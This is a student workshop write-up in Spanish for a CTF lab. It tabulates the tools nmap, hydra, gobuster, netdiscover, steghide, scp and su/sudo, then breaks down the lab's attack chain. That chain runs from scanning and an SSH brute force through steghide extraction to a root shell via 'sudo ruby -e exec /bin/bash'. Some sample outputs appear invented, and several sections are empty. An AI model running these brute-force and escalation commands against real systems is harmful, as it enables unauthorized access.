<img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/b28f545e-7366-403e-9e06-4882728bf873" />

# **TALLER ELECTIVA HABILIDADES PRACTICAS EN EL CIBERESPACIO**
# - **Rubén Dario Contreras Caballero**

# :rotating_light::bulb: Puntos a desarrollar :bulb::rotating_light: 

# :one: Realizar una investigación individual de cada una de las herramientas empleadas. Sintetice el resultado mediante un cuadro que explique su definición, funcionalidad y casos de uso.
| Imagen | Herramienta | Definición ampliada | Funcionalidad completa | Casos de uso relevantes | Ejemplos específicos |
|--------|-------------|-------------------|----------------------|------------------------|---------------------|
| :whale: | **Docker** | Plataforma de código abierto que utiliza virtualización a nivel de sistema operativo mediante contenedores Linux (namespaces y cgroups). Empaqueta aplicaciones con todas sus dependencias en unidades portátiles y reproducibles que garantizan consistencia entre entornos de desarrollo, testing y producción[2][5][8]. | Crear y gestionar contenedores ligeros; orquestación de aplicaciones multicapa con Docker Compose; gestión de imágenes y registries; aislamiento de procesos y recursos; networking entre contenedores; volúmenes persistentes; integración CI/CD; escalabilidad horizontal mediante Docker Swarm/Kubernetes[11][17]. | Desarrollo de microservicios y arquitecturas distribuidas; entornos de desarrollo consistentes entre equipos; despliegue en múltiples clouds (híbrido/multi-cloud); pipelines de CI/CD automatizados; contenerización de aplicaciones legacy; testing en entornos aislados; despliegues blue-green y canary releases[44][47]. | `docker run -d -p 80:80 --name webserver nginx` (servidor web con mapeo de puertos), `docker build -t myapp:1.0 .` (construcción de imagen desde Dockerfile), `docker-compose up -d` (orquestación multi-contenedor), `docker exec -it container_name /bin/bash` (acceso shell interactivo) |
| 🌐 | **Nmap** | Network Mapper - herramienta de código abierto para descubrimiento de red y auditoría de seguridad. Utiliza múltiples técnicas de escaneo (TCP SYN, connect, UDP, etc.) para mapear redes, identificar hosts activos, servicios, versiones y sistemas operativos. Incluye NSE (Nmap Scripting Engine) con más de 600 scripts especializados[3][6][9]. | Descubrimiento de hosts mediante ping sweep y ARP; escaneo de puertos TCP/UDP con técnicas stealth; detección de servicios y banner grabbing; fingerprinting avanzado de OS; evasión de firewalls/IDS mediante fragmentación y timing; escaneo de vulnerabilidades con scripts NSE; mapeo de topología de red; análisis de rendimiento[12][15][18]. | Auditorías de seguridad y pentesting profesional; inventario automatizado de activos de red; monitoreo de servicios críticos y disponibilidad; detección de dispositivos no autorizados (rogue devices); análisis forense de infraestructura; validación de políticas de firewall; identificación de servicios vulnerables para patch management[21]. | `nmap -sS -O -sV target.com` (escaneo sigiloso con detección OS/versiones), `nmap --script vuln 192.168.1.0/24` (escaneo vulnerabilidades en subred), `nmap -sV -p 1-65535 --min-rate 5000 target` (escaneo completo rápido), `nmap -sn 10.0.0.0/8` (ping sweep para host discovery) |
| :lock_with_ink_pen: | **Hydra** | THC-Hydra - herramienta de fuerza bruta paralela multi-protocolo que realiza ataques de login automatizados. Soporta más de 50 protocolos (SSH, HTTP, FTP, Telnet, SMTP, etc.) con capacidad de paralelización mediante múltiples hilos. Optimizada para velocidad y eficiencia en ataques de diccionario y combinatorios[4][7][13]. | Ataques de fuerza bruta contra servicios de red; soporte nativo para 50+ protocolos; ataques de diccionario con wordlists personalizadas; paralelización configurable hasta 64 hilos; bypass de medidas anti-brute force básicas; soporte para proxies SOCKS4/5; módulos específicos para aplicaciones web; logging detallado y formato de salida personalizable[10][16]. | Testing de robustez de contraseñas en auditorías de seguridad; evaluación de políticas de autenticación corporativas; identificación de credenciales débiles en servicios críticos; validación de implementaciones anti-brute force; testing de aplicaciones web (forms, HTTP basic auth); recuperación forense de passwords; compliance con estándares de seguridad[19]. | `hydra -L users.txt -P rockyou.txt ssh://192.168.1.100 -t 16` (SSH con listas), `hydra -l admin -P passwords.txt http-get://site.com/admin/` (HTTP basic auth), `hydra -l user -p password -s 3389 rdp://target.com` (RDP puerto específico), `hydra -C credentials.txt -o results.txt ftp://server.com` (formato combinado usuario:password) |
| 📡 | **netdiscover** | Escáner ARP activo/pasivo especializado en descubrimiento de hosts en redes locales Ethernet. Desarrollado para redes inalámbricas sin DHCP durante wardriving. Basado en libnet y libpcap, opera enviando requests ARP (activo) o monitoreando tráfico ARP existente (pasivo) para identificar dispositivos activos[22][25][28]. | Escaneo ARP activo con requests personalizables; modo pasivo para monitoreo stealth; auto-detección de rangos de red comunes; identificación de direcciones MAC y fabricantes (OUI lookup); interfaz ncurses en tiempo real; soporte para múltiples interfaces de red; filtrado avanzado con expresiones pcap; detección en redes switched y wireless[31][34][37]. | Reconocimiento inicial en pentesting (fase de enumeración); descubrimiento de dispositivos IoT, impresoras y equipos embebidos; mapeo de redes inalámbricas y segmentos VLAN; detección de dispositivos no inventariados; auditorías de inventario de red automatizadas; identificación de rogue devices y shadow IT; análisis de segmentación de red empresarial[40]. | `netdiscover -r 192.168.1.0/24 -i eth0` (escaneo activo interfaz específica), `netdiscover -p -i wlan0 -P` (modo pasivo WiFi sin banner), `netdiscover -f -P` (fast scan rangos comunes), `netdiscover -l network_ranges.txt -P` (escaneo desde archivo batch) |
| 🔍 | **gobuster** | Herramienta de fuerza bruta especializada escrita en Go, optimizada para descubrimiento de recursos web. Su arquitectura concurrente la hace extremadamente rápida para enumerar directorios, archivos, subdominios DNS y virtual hosts. Incluye módulos especializados para diferentes vectores de ataque web[23][26][29]. | Fuerza bruta de directorios/archivos web con wordlists; enumeración de subdominios DNS con soporte wildcard; virtual host discovery (vhost bruteforcing); búsqueda en cloud storage (S3, GCS buckets); soporte para múltiples extensiones simultáneas; autenticación HTTP (Basic, NTLM); manejo inteligente de redirects; filtrado por status codes y tamaños[32][35]. | Reconocimiento web en pentesting (información gathering); descubrimiento de paneles administrativos y APIs ocultas; enumeración de endpoints para aplicaciones REST; búsqueda de archivos de backup (.bak, .old, .backup); mapeo completo de aplicaciones web y CMS; identificación de subdominios para ampliar superficie de ataque; búsqueda de contenido sensible expuesto (configs, logs)[38][41]. | `gobuster dir -u https://target.com -w common.txt -x php,html,js` (directorios con extensiones), `gobuster dns -d example.com -w subdomains.txt --wildcard` (subdominios con wildcard), `gobuster vhost -u http://target.com -w vhosts.txt -a "User-Agent"` (virtual hosts), `gobuster s3 -w bucket-names.txt --threads 50` (buckets S3 paralelos) |
| 🔒 | **scp** | Secure Copy Protocol - protocolo de transferencia segura basado en SSH que combina la funcionalidad de RCP (Remote Copy) con cifrado y autenticación robustos. Opera sobre el puerto TCP 22 (SSH) proporcionando integridad, confidencialidad y autenticidad durante la transferencia de archivos entre sistemas[24][27][30]. | Transferencia cifrada bidireccional de archivos/directorios; autenticación mediante claves SSH (RSA, ECDSA, Ed25519) o contraseñas; preservación de metadatos (timestamps, permisos, ownership); compresión opcional durante transferencia (-C flag); soporte para jump hosts y proxy commands; transferencia recursiva con verificación de integridad; compatibilidad multiplataforma (Unix, Linux, Windows)[33][36][39]. | Backup seguro de datos críticos y bases de datos; distribución automatizada de actualizaciones y parches; transferencia de logs para análisis forense; despliegue de aplicaciones y configuraciones en servidores; sincronización de archivos entre entornos (dev/staging/prod); migración segura de datos entre datacenters; automatización en scripts de CI/CD; transferencia de certificados y claves criptográficas. | `scp -r -C app_backup/ user@server:/backups/$(date +%Y%m%d)/` (backup recursivo comprimido), `scp -P 2222 -i ~/.ssh/key.pem file.txt admin@server:/opt/configs/` (puerto/clave específica), `scp user1@server1:/logs/* user2@server2:/analysis/` (transferencia remoto-remoto), `scp -o ProxyCommand="ssh gateway nc %h %p" file.txt target:/path/` (a través de jump host) |
| 🖼️ | **steghide** | Herramienta avanzada de esteganografía que implementa algoritmos de ocultación de datos en archivos multimedia. Utiliza técnicas de incrustación en el dominio de frecuencia (DCT para JPEG) y cifrado AES-128 en modo CBC. Soporta compresión automática y verificación de integridad mediante checksums CRC32[42][45][48]. | Ocultación de datos en JPEG/BMP (imágenes) y WAV/AU (audio); cifrado AES-128-CBC de payloads; compresión automática con zlib (niveles 1-9); verificación de integridad con CRC32 checksum; análisis de capacidad de portador; extracción sin pérdida de calidad; protección por contraseña robusta; preservación de metadatos EXIF/ID3[50][53][56]. | Comunicación encubierta en investigaciones de inteligencia; ocultación de información sensible para bypass de DLP; exfiltración stealth de datos en pentesting; CTFs y competencias de ciberseguridad; protección de propiedad intelectual en medios; comunicación segura en regímenes restrictivos; backup de credenciales/llaves en archivos aparentemente inocuos; watermarking digital avanzado[59]. | `steghide embed -cf photo.jpg -ef secrets.txt -p "password123"` (ocultar con password), `steghide extract -sf suspicious.jpg -xf extracted_data.txt` (extraer a archivo específico), `steghide info image.jpg` (analizar capacidad sin extraer), `steghide embed -cf audio.wav -ef payload.zip -e rijndael-128 -m cbc` (cifrado específico) |
| ⚡ | **su / sudo** | Su (Switch User) permite cambio completo de identidad, mientras sudo (Superuser Do) otorga ejecución temporal con privilegios elevados. Sudo implementa el principio de menor privilegio con políticas granulares definidas en /etc/sudoers, logging completo via syslog y timeouts configurables de sesión[43][46][49]. | Cambio de identidad completa (su) vs ejecución temporal privilegiada (sudo); políticas granulares por usuario/grupo/comando/host; auditoría completa con logging detallado; timeouts de sesión y re-autenticación; soporte para autenticación multifactor (PAM); modo no-interactivo para scripts; delegation de permisos específicos sin acceso root; integración con LDAP/AD para entornos empresariales[51][57][60]. | Escalada de privilegios en post-explotación y pentesting; administración segura de sistemas multiusuario críticos; implementación de principio de menor privilegio en SOC; auditorías de actividades administrativas para compliance; automatización de tareas que requieren privilegios elevados; gestión de accesos temporales en entornos DevOps; troubleshooting con permisos controlados; trazabilidad completa para forensics[54]. | `sudo -u apache cat /var/log/httpd/error_log` (comando como usuario específico), `sudo -s` vs `su -` (shell privilegiada temporal vs cambio completo), `sudo visudo` (edición segura de políticas sudoers), `sudo -l -U username` (auditar permisos de usuario), `echo 'password' | sudo -S systemctl restart nginx` (modo no-interactivo para scripts) |

# :two: Explicar en detalle cada uno de los comandos empleados en el anterior CTF; realizando un desglose del mismo y citando al menos tres alternativas (si aplica) de variantes del comando para las herramientas empleadas, este punto amplia el ejercicio anterior.
## a) netdiscover – Descubrimiento de Hosts en Red Local

| **Aspecto** | **Detalle** |
|-------------|-------------|
| **Comando usado** | `sudo netdiscover -i docker0 -r 172.17.0.0/24` |
| **Propósito** | Descubre hosts activos mediante requests ARP en la red Docker |
| **Salida esperada** | 2 hosts encontrados:<br>• 172.17.0.1<br>• 172.17.0.2 |

| **Variantes útiles** | **Funcionalidad** | **Ejemplo de uso** |
|---------------------|-------------------|--------------------|
| `netdiscover -p -i docker0` | Modo pasivo (solo escucha ARP) | Monitoreo stealth sin enviar paquetes |
| `netdiscover -f -r 172.17.0.0/24` | Modo rápido con escaneo acelerado | Escaneo veloz para redes grandes |
| `netdiscover -P -r 172.17.0.0/24` | Salida parseable para scripts | Automatización e integración |

## **Casos de uso reales:** Identificación inicial de dispositivos IoT en redes corporativas, mapeo de segmentos VLAN durante auditorías, detección de rogue devices en infraestructuras críticas
---

## b) nmap – Escaneo Avanzado de Puertos y Servicios

| **Aspecto** | **Detalle** |
|-------------|-------------|
| **Comando usado** | `sudo nmap --min-rate 5,000 -p- -sS -sV 172.17.0.2` |
| **Propósito** | Escaneo SYN stealth de todos los puertos TCP con detección de versiones |
| **Salida esperada** | Puertos abiertos: 22/tcp (SSH) y 80/tcp (HTTP) |

| **Alternativas avanzadas** | **Funcionalidad** | **Ejemplo de uso** |
|---------------------------|-------------------|--------------------|
| `nmap -A -T4 172.17.0.2` | Escaneo agresivo (OS + scripts + traceroute) | `OS: Linux 5.4.0-91-generic` |
| `nmap -sU --top-ports 1,000 172.17.0.2` | Escaneo UDP de puertos más comunes | `161/udp open snmp` |
| `nmap --script vuln 172.17.0.2` | Detección de vulnerabilidades con NSE | `CVE-2014-6271 (Shellshock) detected` |

## **Casos de uso reales:**
---

## c) gobuster – Enumeración de Directorios Web

| **Aspecto** | **Detalle** |
|-------------|-------------|
| **Comando usado** | `gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` |
| **Propósito** | Fuerza bruta de directorios ocultos usando wordlist de 220,560 entradas |
| **Salida esperada** | Directorios: /images 301, /css 301, /js 301 |

| **Variantes útiles** | **Funcionalidad** | **Ejemplo de uso** |
|---------------------|-------------------|--------------------|
| `-x php,html,js,txt` | Busca archivos con extensiones específicas | `/admin.php (Status: 200)` |
| `-t 50 -q` | 50 hilos en modo silencioso | Mayor velocidad sin output verbose |
| `-r -k` | Seguir redirects, ignorar SSL | `/secure/ -> /login.php` |

## **Casos de uso reales:**
---

## d) hydra – Ataque de Fuerza Bruta SSH

| **Aspecto** | **Detalle** |
|-------------|-------------|
| **Comando usado** | `hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10` |
| **Propósito** | Ataque de diccionario contra SSH |
| **Salida esperada** | Credencial válida: carlota / babygirl |

| **Variantes avanzadas** | **Funcionalidad** | **Ejemplo de uso** |
|------------------------|-------------------|--------------------|
| `-L users.txt -P passwords.txt` | Lista de usuarios y contraseñas | Ataque masivo con credenciales corporativas |
| `-s 2222` | Puerto SSH personalizado | `[2222][ssh] host: 172.17.0.2 login: admin password: 123456` |
| `-C combo.txt -o results.txt` | Formato combinado usuario:password | Salida guardada en `results.txt` |

## **Casos de uso reales:**
---

## e) scp – Transferencia Segura de Archivos

| **Aspecto** | **Detalle** |
|-------------|-------------|
| **Comando usado** | `scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor` |
| **Propósito** | Descarga cifrada de archivo remoto |
| **Salida esperada** | Transferencia 100% completada |

| **Opciones avanzadas** | **Funcionalidad** | **Ejemplo de uso** |
|-----------------------|-------------------|--------------------|
| `-r -C` | Recursivo con compresión | Backup completo de directorios |
| `-P 2222 -i ~/.ssh/key.pem` | Puerto y clave específica | Transferencia a puerto 2222 |
| `-v` | Modo verbose para debugging | `debug1: Authentication succeeded` |

## **Casos de uso reales:**
---

## f) steghide – Análisis de Esteganografía

| **Aspecto** | **Detalle** |
|-------------|-------------|
| **Comando usado** | `steghide --extract -sf imagen.jpg` |
| **Propósito** | Extrae datos ocultos en JPEG |
| **Salida esperada** | Archivo “secret.txt” extraído |

| **Comandos relacionados** | **Funcionalidad** | **Ejemplo de uso** |
|--------------------------|-------------------|--------------------|
| `--info imagen.jpg` | Consulta metadatos de esteganografía | Informa tamaño y algoritmo |
| `--embed -ef datos.txt -cf imagen.jpg -p clave` | Oculta datos con contraseña | Esteganografía ofensiva |
| `--extract -sf imagen.jpg -xf output.txt` | Extrae a archivo específico | Output en `output.txt` |

## **Casos de uso reales:**
---

## g) Escalada de Privilegios (su / sudo)

| **Comando** | **Propósito** | **Salida esperada** |
|-------------|---------------|--------------------|
| `echo "ZXNsYWNhc2FkZXBpbnlwb24=" \| base64 -d` | Decodifica Base64 | `eslacasadepinypon` |
| `su oscar` | Cambio a usuario `oscar` | `oscar@amor:~$` |
| `sudo -l` | Lista permisos sudo | `NOPASSWD: /usr/bin/ruby` |
| `sudo /usr/bin/ruby -e 'exec "/bin/bash"'` | Shell root vía Ruby | `root@amor:~#` |

## **Casos de uso reales:**

# :three: Realice un diagrama de flujo de todo el procedimiento realizado.



